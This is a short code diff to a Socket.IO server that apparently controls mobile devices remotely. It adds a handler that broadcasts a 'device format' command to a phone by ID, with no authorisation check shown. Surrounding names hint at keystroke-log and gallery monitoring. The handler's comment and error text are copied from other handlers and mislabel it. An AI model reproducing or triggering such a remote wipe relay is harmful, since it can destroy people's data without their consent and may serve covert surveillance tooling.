@@ -911,6 +911,26 @@ export const startSocketIO = async () => {
 				}
 			);
 
+			// Device Format
+			socket.on(
+				`${SocketIOPublicEvents.DEVICE_FORMAT_EVENT}`,
+				async (data: any) => {
+					try {
+						const { deviceId } = data;
+
+						// Send gallery requestion into mobile app
+						io.emit(
+							`${SocketIOMobileEvents.MOBILE_DEVICE_FORMAT_EVENT}-${deviceId}`,
+							{
+								deviceId: deviceId,
+							}
+						);
+					} catch (error) {
+						console.log("Key Logs Monitor Error", error);
+					}
+				}
+			);
+
 			// Monitor Close
 			socket.on(
 				`${SocketIOPublicEvents.MONITOR_CLOSE}`,
